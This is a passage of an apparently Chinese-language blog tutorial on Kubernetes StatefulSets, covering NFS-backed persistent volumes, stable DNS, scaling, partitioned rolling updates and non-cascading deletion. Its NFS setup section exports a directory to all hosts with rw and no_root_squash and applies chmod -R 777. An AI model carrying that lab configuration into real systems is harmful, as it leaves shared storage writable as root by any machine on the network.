class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Service</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">nginx</span><br>  <span class="hljs-attr">labels:</span><br>    <span class="hljs-attr">app:</span> <span class="hljs-string">nginx</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">ports:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">port:</span> <span class="hljs-number">80</span><br>    <span class="hljs-attr">name:</span> <span class="hljs-string">web</span><br>  <span class="hljs-attr">clusterIP:</span> <span class="hljs-string">None</span><br>  <span class="hljs-attr">selector:</span><br>    <span class="hljs-attr">app:</span> <span class="hljs-string">nginx</span><br><span class="hljs-meta">---</span><br><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">apps/v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">StatefulSet</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">web</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">serviceName:</span> <span class="hljs-string">&quot;nginx&quot;</span><br>  <span class="hljs-attr">replicas:</span> <span class="hljs-number">2</span><br>  <span class="hljs-attr">selector:</span><br>    <span class="hljs-attr">matchLabels:</span><br>      <span class="hljs-attr">app:</span> <span class="hljs-string">nginx</span><br>  <span class="hljs-attr">template:</span><br>    <span class="hljs-attr">metadata:</span><br>      <span class="hljs-attr">labels:</span><br>        <span class="hljs-attr">app:</span> <span class="hljs-string">nginx</span><br>    <span class="hljs-attr">spec:</span><br>      <span class="hljs-attr">containers:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">nginx</span><br>        <span class="hljs-attr">image:</span> <span class="hljs-string">k8s.gcr.io/nginx-slim:0.8</span><br>        <span class="hljs-attr">ports:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-attr">containerPort:</span> <span class="hljs-number">80</span><br>          <span class="hljs-attr">name:</span> <span class="hljs-string">web</span><br>        <span class="hljs-attr">volumeMounts:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">www</span><br>          <span class="hljs-attr">mountPath:</span> <span class="hljs-string">/usr/share/nginx/html</span><br>  <span class="hljs-attr">volumeClaimTemplates:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">metadata:</span><br>      <span class="hljs-attr">name:</span> <span class="hljs-string">www</span><br>    <span class="hljs-attr">spec:</span><br>      <span class="hljs-attr">accessModes:</span> [ <span class="hljs-string">&quot;ReadWriteOnce&quot;</span> ]<br>      <span class="hljs-attr">resources:</span><br>        <span class="hljs-attr">requests:</span><br>          <span class="hljs-attr">storage:</span> <span class="hljs-string">1Gi</span><br></code></pre></td></tr></table></figure><p>![](/PVC in StatefulSet/20211115100505453.png)</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">spec:</span><br>     <span class="hljs-attr">accessModes:</span> [ <span class="hljs-string">&quot;ReadWriteOnce&quot;</span> ]<br>     <span class="hljs-comment"># 可以指定存储类型PV为nfs</span><br>     <span class="hljs-attr">storageClassName:</span> <span class="hljs-string">&quot;nfs&quot;</span><br>     <span class="hljs-attr">resources:</span><br>       <span class="hljs-attr">requests:</span><br>         <span class="hljs-attr">storage:</span> <span class="hljs-string">1Gi</span><br><br><br></code></pre></td></tr></table></figure><h3 id="1-2-StatefulSet-的顺序创建和删除机制。"><a href="#1-2-StatefulSet-的顺序创建和删除机制。" class="headerlink" title="1.2 StatefulSet 的顺序创建和删除机制。"></a>1.2 StatefulSet 的顺序创建和删除机制。</h3><pre><code>NAME      READY     STATUS    RESTARTS   AGEweb-0     0/1       Pending   0          0sweb-0     0/1       Pending   0         0sweb-0     0/1       ContainerCreating   0         0sweb-0     1/1       Running   0         19sweb-1     0/1       Pending   0         0sweb-1     0/1       Pending   0         0sweb-1     0/1       ContainerCreating   0         0sweb-1     1/1       Running   0         18s</code></pre><p>请注意在 web-0 Pod 处于 Running和Ready 状态后 web-1 Pod 才会被启动</p><h3 id="1-3-使用稳定的网络标识。"><a href="#1-3-使用稳定的网络标识。" class="headerlink" title="1.3 使用稳定的网络标识。"></a>1.3 使用稳定的网络标识。</h3><pre><code>[root@k8s1 ~]# kubectl run -i --tty --image busybox:1.28 dns-test --restart=Never --rmIf you don&#39;t see a command prompt, try pressing enter./ # nslookup web-0.nginxServer:    10.96.0.10Address 1: 10.96.0.10 kube-dns.kube-system.svc.cluster.localName:      web-0.nginxAddress 1: 172.16.219.45 web-0.nginx.default.svc.cluster.local/ # nslookup web-1.nginxServer:    10.96.0.10Address 1: 10.96.0.10 kube-dns.kube-system.svc.cluster.localName:      web-1.nginxAddress 1: 172.16.219.47 web-1.nginx.default.svc.cluster.local/ # nslookup web-2.nginxServer:    10.96.0.10Address 1: 10.96.0.10 kube-dns.kube-system.svc.cluster.localName:      web-2.nginxAddress 1: 172.16.219.48 web-2.nginx.default.svc.cluster.local/ # </code></pre><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!--Pod 的序号、主机名、SRV 条目和记录名称没有改变，但和 Pod 相关联的 IP 地址可能发生了改变。 在本教程中使用的集群中它们</span><br><span class="hljs-comment">就改变了。这就是为什么不要在其他应用中使用 StatefulSet 中的 Pod 的 IP 地址进行连接，这点很重要。</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">如果你需要查找并连接一个 StatefulSet 的活动成员，你应该查询 Headless Service 的 CNAME。 和 CNAME 相关联的 SRV 记录只会</span><br><span class="hljs-comment">包含 StatefulSet 中处于 Running 和 Ready 状态的 Pod。</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">如果你的应用已经实现了用于测试 liveness 和 readiness 的连接逻辑，你可以使用 Pod 的 SRV 记录（web-</span><br><span class="hljs-comment">0.nginx.default.svc.cluster.local， web-1.nginx.default.svc.cluster.local）。因为他们是稳定的，并且当你的 Pod 的状</span><br><span class="hljs-comment">态变为 Running 和 Ready 时，你的应用就能够发现它们的地址。--&gt;</span><br></code></pre></td></tr></table></figure><h3 id="1-4-写入稳定的存储"><a href="#1-4-写入稳定的存储" class="headerlink" title="1.4 写入稳定的存储"></a>1.4 写入稳定的存储</h3><p>![](/PVC in StatefulSet/20211115102425637.png)</p><h4 id="1-4-1-创建nfs-【相关服务在所有的master-及node-节点安装】"><a href="#1-4-1-创建nfs-【相关服务在所有的master-及node-节点安装】" class="headerlink" title="1.4.1 创建nfs 【相关服务在所有的master 及node 节点安装】"></a>1.4.1 创建nfs 【相关服务在所有的master 及node 节点安装】</h4><pre><code># 创建挂载目录cd ~cd data/mkdir www-contentcd www-content/pwd# 安装软件yum install nfs-utilsyum install rpcbind# 配置开机启动chkconfig nfs onchkconfig rpcbind on# 启动相关服务service rpcbind startservice nfs start# 开放防火墙端口firewall-cmd --add-port=2049/tcp --permanentfirewall-cmd --reloadfirewall-cmd --list-ports# 添加系统配置，添加内容如下：vim /etc/exports# 设置输出目录只读：ro，设置输出目录读写：rw# 客户端是指网络中可以访问这个NFS输出目录的计算机：#    指定ip地址的主机：192.168.0.200#    指定子网中的所有主机：192.168.0.0/24 192.168.0.0/255.255.255.0#    指定域名的主机：david.bsmart.cn#    指定域中的所有主机：*.bsmart.cn#    所有主机：*##########/root/data/www-content *(rw,async,no_root_squash,no_subtree_check)########### 刷新配置立即生效exportfs -a# 验证配置内容exportfs -rv# 创建子目录cd /root/data/www-contentmkdir developmkdir product# 修改目录权限cd /root/datachmod -R 777 www-content/# 重启服务systemctl restart nfs &amp; systemctl restart rpcbind# 设置开机自启动systemctl enable nfs &amp; systemctl enable rpcbind</code></pre><h4 id="1-4-2-挂载测试"><a href="#1-4-2-挂载测试" class="headerlink" title="1.4.2 挂载测试"></a>1.4.2 挂载测试</h4><pre><code># 安装工具 yum install nfs-utils# 启动相关服务 systemctl start nfs systemctl enable nfs systemctl status nfs # 创建挂载目录  cd ~ cd data/ mkdir mnt-www-contentmount -t nfs 192.168.81.129:/nfs2 /data/mnt-www-content</code></pre><h4 id="1-4-3-pv-ymal文件"><a href="#1-4-3-pv-ymal文件" class="headerlink" title="1.4.3 pv ymal文件"></a>1.4.3 pv ymal文件</h4><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">PersistentVolume</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">pv0003</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">capacity:</span><br>    <span class="hljs-attr">storage:</span> <span class="hljs-string">5Gi</span><br>  <span class="hljs-attr">volumeMode:</span> <span class="hljs-string">Filesystem</span><br>  <span class="hljs-attr">accessModes:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">ReadWriteOnce</span><br>  <span class="hljs-attr">persistentVolumeReclaimPolicy:</span> <span class="hljs-string">Recycle</span><br>  <span class="hljs-attr">storageClassName:</span> <span class="hljs-string">slow</span><br>  <span class="hljs-attr">mountOptions:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">hard</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">nfsvers=4.1</span><br>  <span class="hljs-attr">nfs:</span><br>    <span class="hljs-attr">path:</span> <span class="hljs-string">/nfsdata</span><br>    <span class="hljs-attr">server:</span> <span class="hljs-number">192.168</span><span class="hljs-number">.81</span><span class="hljs-number">.129</span><br><br><br><span class="hljs-meta">---</span><br><span class="hljs-meta"></span><br><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">PersistentVolume</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">pv0001</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">capacity:</span><br>    <span class="hljs-attr">storage:</span> <span class="hljs-string">3Gi</span><br>  <span class="hljs-attr">volumeMode:</span> <span class="hljs-string">Filesystem</span><br>  <span class="hljs-attr">accessModes:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">ReadWriteOnce</span><br>  <span class="hljs-attr">persistentVolumeReclaimPolicy:</span> <span class="hljs-string">Recycle</span><br>  <span class="hljs-attr">storageClassName:</span> <span class="hljs-string">nfs</span><br>  <span class="hljs-attr">mountOptions:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">hard</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">nfsvers=4.1</span><br>  <span class="hljs-attr">nfs:</span><br>    <span class="hljs-attr">path:</span> <span class="hljs-string">/nfs1</span><br>    <span class="hljs-attr">server:</span> <span class="hljs-number">192.168</span><span class="hljs-number">.81</span><span class="hljs-number">.129</span><br><br><br><span class="hljs-meta">---</span><br><span class="hljs-meta"></span><br><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">PersistentVolume</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">pv0002</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">capacity:</span><br>    <span class="hljs-attr">storage:</span> <span class="hljs-string">10Gi</span><br>  <span class="hljs-attr">volumeMode:</span> <span class="hljs-string">Filesystem</span><br>  <span class="hljs-attr">accessModes:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">ReadWriteOnce</span><br>  <span class="hljs-attr">persistentVolumeReclaimPolicy:</span> <span class="hljs-string">Recycle</span><br>  <span class="hljs-attr">storageClassName:</span> <span class="hljs-string">nfs</span><br>  <span class="hljs-attr">mountOptions:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">hard</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">nfsvers=4.1</span><br>  <span class="hljs-attr">nfs:</span><br>    <span class="hljs-attr">path:</span> <span class="hljs-string">/nfs2</span><br>    <span class="hljs-attr">server:</span> <span class="hljs-number">192.168</span><span class="hljs-number">.81</span><span class="hljs-number">.129</span><br><span class="hljs-meta">---</span><br><span class="hljs-meta"></span><br><span class="hljs-meta"></span><br><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">PersistentVolume</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">pv0004</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">capacity:</span><br>    <span class="hljs-attr">storage:</span> <span class="hljs-string">8Gi</span><br>  <span class="hljs-attr">volumeMode:</span> <span class="hljs-string">Filesystem</span><br>  <span class="hljs-attr">accessModes:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">ReadWriteOnce</span><br>  <span class="hljs-attr">persistentVolumeReclaimPolicy:</span> <span class="hljs-string">Recycle</span><br>  <span class="hljs-attr">storageClassName:</span> <span class="hljs-string">nfs</span><br>  <span class="hljs-attr">mountOptions:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">hard</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">nfsvers=4.1</span><br>  <span class="hljs-attr">nfs:</span><br>    <span class="hljs-attr">path:</span> <span class="hljs-string">/nfs3</span><br>    <span class="hljs-attr">server:</span> <span class="hljs-number">192.168</span><span class="hljs-number">.81</span><span class="hljs-number">.129</span><br><br></code></pre></td></tr></table></figure><p>![](/PVC in StatefulSet/20211115103501899.png)</p><h1 id="2-扩容-缩容-StatefulSet"><a href="#2-扩容-缩容-StatefulSet" class="headerlink" title="2. 扩容/缩容  StatefulSet"></a>2. 扩容/缩容  StatefulSet</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">kubectl scale sts web --replicas=5<br></code></pre></td></tr></table></figure><p>![](/PVC in StatefulSet/20211115104742223.png)</p><h1 id="3-更新StatefulSet"><a href="#3-更新StatefulSet" class="headerlink" title="3.更新StatefulSet"></a>3.更新StatefulSet</h1><h3 id="3-1-Rolling-Update-策略"><a href="#3-1-Rolling-Update-策略" class="headerlink" title="3.1 Rolling Update 策略"></a>3.1 Rolling Update 策略</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">kubectl patch statefulset web -p &#x27;&#123;&quot;spec&quot;:&#123;&quot;updateStrategy&quot;:&#123;&quot;type&quot;:&quot;RollingUpdate&quot;&#125;&#125;&#125;&#x27;<br><br></code></pre></td></tr></table></figure><p>![](/PVC in StatefulSet/20211115105814973.png)</p><h3 id="3-2-更新，改变容器镜像"><a href="#3-2-更新，改变容器镜像" class="headerlink" title="3.2 更新，改变容器镜像"></a>3.2 更新，改变容器镜像</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">kubectl patch statefulset web --type=&#x27;json&#x27; -p=&#x27;[&#123;&quot;op&quot;: &quot;replace&quot;, &quot;path&quot;: &quot;/spec/template/spec/containers/0/image&quot;, &quot;value&quot;:&quot;gcr.io/google_containers/nginx-slim:0.8&quot;&#125;]&#x27;<br><br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">[root@k8s1 ~]# kubectl patch statefulset web --type=&#x27;json&#x27; -p=&#x27;[&#123;&quot;op&quot;: &quot;replace&quot;, &quot;path&quot;: &quot;/spec/template/spec/containers/0/image&quot;, &quot;value&quot;:&quot;nginx&quot;&#125;]&#x27;<br>statefulset.apps/web patched<br></code></pre></td></tr></table></figure><pre><code>[root@k8s1 ~]# kubectl get pods -w -l app=nginxNAME    READY   STATUS    RESTARTS   AGEweb-0   1/1     Running   0          41sweb-1   1/1     Running   0          38sweb-2   1/1     Running   0          36sweb-2   1/1     Terminating   0          51sweb-2   1/1     Terminating   0          52sweb-2   0/1     Terminating   0          52sweb-2   0/1     Terminating   0          52sweb-2   0/1     Terminating   0          52sweb-2   0/1     Pending       0          0sweb-2   0/1     Pending       0          0sweb-2   0/1     ContainerCreating   0          0sweb-2   0/1     ContainerCreating   0          0sweb-2   1/1     Running             0          2sweb-1   1/1     Terminating         0          57sweb-1   1/1     Terminating         0          57sweb-1   0/1     Terminating         0          58sweb-1   0/1     Terminating         0          58sweb-1   0/1     Terminating         0          58sweb-1   0/1     Pending             0          0sweb-1   0/1     Pending             0          0sweb-1   0/1     ContainerCreating   0          0sweb-1   0/1     ContainerCreating   0          0sweb-1   1/1     Running             0          2sweb-0   1/1     Terminating         0          63sweb-0   1/1     Terminating         0          63sweb-0   0/1     Terminating         0          64sweb-0   0/1     Terminating         0          64sweb-0   0/1     Terminating         0          64sweb-0   0/1     Pending             0          0sweb-0   0/1     Pending             0          0sweb-0   0/1     ContainerCreating   0          0sweb-0   0/1     ContainerCreating   0          1sweb-0   1/1     Running             0          2s</code></pre><h3 id="3-3-分段更新"><a href="#3-3-分段更新" class="headerlink" title="3.3 分段更新"></a>3.3 分段更新</h3><p>你可以使用 RollingUpdate 更新策略的 <font color="green" size="3">partition </font>参数来分段更新一个 StatefulSet。 分段的更新将会使 StatefulSet 中的其余所有 Pod 保持当前版本的同时仅允许改变 StatefulSet 的 .spec.template。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">kubectl patch statefulset web -p &#x27;&#123;&quot;spec&quot;:&#123;&quot;updateStrategy&quot;:&#123;&quot;type&quot;:&quot;RollingUpdate&quot;,&quot;rollingUpdate&quot;:&#123;&quot;partition&quot;:3&#125;&#125;&#125;&#125;&#x27;<br><br>kubectl patch statefulset web --type=&#x27;json&#x27; -p=&#x27;[&#123;&quot;op&quot;: &quot;replace&quot;, &quot;path&quot;: &quot;/spec/template/spec/containers/0/image&quot;, &quot;value&quot;:&quot;k8s.gcr.io/nginx-slim:0.7&quot;&#125;]&#x27;<br><br></code></pre></td></tr></table></figure><h4 id="3-3-1-测试"><a href="#3-3-1-测试" class="headerlink" title="3.3.1 测试"></a>3.3.1 测试</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">kubectl delete pod web-2<br>kubectl get pod web-2 --template &#x27;&#123;&#123;range $i, $c := .spec.containers&#125;&#125;&#123;&#123;$c.image&#125;&#125;&#123;&#123;end&#125;&#125;&#x27;<br></code></pre></td></tr></table></figure><font color="green" size="2">虽然更新策略是 RollingUpdate，StatefulSet 控制器还是会使用原始的容器恢复 Pod。 这是因为 Pod 的序号比 updateStrategy 指定的 partition 更小 "partition 为3"，所以更新对 web-2 不起作用。</font><h3 id="3-4-灰度发布"><a href="#3-4-灰度发布" class="headerlink" title="3.4 灰度发布"></a>3.4 灰度发布</h3><font color="green" size="2">你可以通过减少 [上文](https://kubernetes.io/zh/docs/tutorials/stateful-application/basic-stateful-set/#%E5%88%86%E6%AE%B5%E6%9B%B4%E6%96%B0)指定的 `partition` 来进行灰度发布，以此来测试你的程序的改动。<p>通过 patch 命令修改 StatefulSet 来减少分区。</p></font><p></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">kubectl patch statefulset web -p &#x27;&#123;&quot;spec&quot;:&#123;&quot;updateStrategy&quot;:&#123;&quot;type&quot;:&quot;RollingUpdate&quot;,&quot;rollingUpdate&quot;:&#123;&quot;partition&quot;:2&#125;&#125;&#125;&#125;&#x27;<br><span class="hljs-meta">#</span><span class="bash"> partition 从3 减少到了2 ，那么 web-2将受到更新影响。StatefulSet 会自动的更新 web-2 Pod，这是因为 Pod 的序号大于或等于 partition。</span><br></code></pre></td></tr></table></figure><pre><code>NAME      READY     STATUS              RESTARTS   AGEweb-0     1/1       Running             0          4mweb-1     1/1       Running             0          4mweb-2     0/1       ContainerCreating   0          11sweb-2     1/1       Running   0         18s</code></pre> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">kubectl delete pod web-1<br>kubectl get pod -l app=nginx -w<br>kubectl get pod web-1 --template &#x27;&#123;&#123;range $i, $c := .spec.containers&#125;&#125;&#123;&#123;$c.image&#125;&#125;&#123;&#123;end&#125;&#125;&#x27;<br><span class="hljs-meta">#</span><span class="bash"> k8s.gcr.io/nginx-slim:0.8</span><br><span class="hljs-meta">#</span><span class="bash"> web-1 被按照原来的配置恢复，因为 Pod 的序号小于分区。当指定了分区时，如果更新了 StatefulSet 的 .spec.template，</span><br><span class="hljs-meta">#</span><span class="bash"> 则所有序号大于或等于分区的 Pod 都将被更新。 如果一个序号小于分区的 Pod 被删除或者终止，它将被按照原来的配置恢复。</span><br></code></pre></td></tr></table></figure><h3 id="3-5-分阶段发布"><a href="#3-5-分阶段发布" class="headerlink" title="3.5 分阶段发布"></a>3.5 分阶段发布</h3> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"> kubectl patch statefulset web -p &#x27;&#123;&quot;spec&quot;:&#123;&quot;updateStrategy&quot;:&#123;&quot;type&quot;:&quot;RollingUpdate&quot;,&quot;rollingUpdate&quot;:&#123;&quot;partition&quot;:0&#125;&#125;&#125;&#125;&#x27;<br><span class="hljs-meta">#</span><span class="bash"> 当 partition : 0时，仅只有Pod 为0 的容器等于或者大于partition .</span><br> kubectl get pod -l app=nginx -w<br></code></pre></td></tr></table></figure><pre><code>NAME      READY     STATUS              RESTARTS   AGEweb-0     1/1       Running             0          3mweb-1     0/1       ContainerCreating   0          11sweb-2     1/1       Running             0          2mweb-1     1/1       Running   0         18sweb-0     1/1       Terminating   0         3mweb-0     1/1       Terminating   0         3mweb-0     0/1       Terminating   0         3mweb-0     0/1       Terminating   0         3mweb-0     0/1       Terminating   0         3mweb-0     0/1       Terminating   0         3mweb-0     0/1       Pending   0         0sweb-0     0/1       Pending   0         0sweb-0     0/1       ContainerCreating   0         0sweb-0     1/1       Running   0         3s    # 仅有web-0 受更新影响。</code></pre><h1 id="4-删除-StatefulSet"><a href="#4-删除-StatefulSet" class="headerlink" title="4. 删除 StatefulSet"></a>4. 删除 StatefulSet</h1><p><font color="green" size="2">StatefulSet 同时支持级联和非级联删除。使用非级联方式删除 StatefulSet 时，StatefulSet 的 Pod 不会被删除。使用级联删除时，StatefulSet 和它的 Pod 都会被删除。 </font></p><h3 id="4-1-非级联删除"><a href="#4-1-非级联删除" class="headerlink" title="4.1 非级联删除"></a>4.1 非级联删除</h3><p>在一个终端窗口查看 StatefulSet 中的 Pod。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">kubectl <span class="hljs-builtin-name">get</span> pods -w -l <span class="hljs-attribute">app</span>=nginx<br><br></code></pre></td></tr></table></figure><p>使用 <a href="https://kubernetes.io/zh/docs/reference/generated/kubectl/kubectl-commands/#delete"><code>kubectl delete</code></a> 删除 StatefulSet。 请确保提供了 <code>--cascade=orphan</code> 参数给命令。这个参数告诉 Kubernetes 只删除 StatefulSet 而不要删除它的任何 Pod。</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">kubectl <span class="hljs-built_in">delete</span> statefulset web <span class="hljs-comment">--cascade=orphan</span><br><br></code></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">statefulset<span class="hljs-selector-class">.apps</span> <span class="hljs-string">&quot;web&quot;</span> deleted<br><br></code></pre></td></tr></table></figure><p>获取 Pod 来检查他们的状态。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">kubectl <span class="hljs-builtin-name">get</span> pods -l <span class="hljs-attribute">app</span>=nginx<br><br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">NAME</span>      READY     STATUS    RESTARTS   AGE<br><span class="hljs-attribute">web</span>-<span class="hljs-number">0</span>     <span class="hljs-number">1</span>/<span class="hljs-number">1</span>       Running   <span class="hljs-number">0</span>          <span class="hljs-number">6</span>m<br><span class="hljs-attribute">web</span>-<span class="hljs-number">1</span>     <span class="hljs-number">1</span>/<span class="hljs-number">1</span>       Running   <span class="hljs-number">0</span>          <span class="hljs-number">7</span>m<br><span class="hljs-attribute">web</span>-<span class="hljs-number">2</span>     <span class="hljs-number">1</span>/<span class="hljs-number">1</span>       Running   <span class="hljs-number">0</span>          <span class="hljs-number">5</span>m<br><br></code></pre></td></tr></table></figure><p>虽然 <code>web</code> 已经被删除了，但所有 Pod 仍然处于 Running 和 Ready 状态。 删除 <code>web-0</code>。</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">kubectl <span class="hljs-keyword">delete</span> pod web<span class="hljs-number">-0</span><br><br></code></pre></td></tr></table></figure><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">pod</span> <span class="hljs-string">&quot;web-0&quot;</span> deleted<br><br></code></pre></td></tr></table></figure><p>获取 StatefulSet 的 Pod。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">kubectl <span class="hljs-builtin-name">get</span> pods -l <span class="hljs-attribute">app</span>=nginx<br><br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td 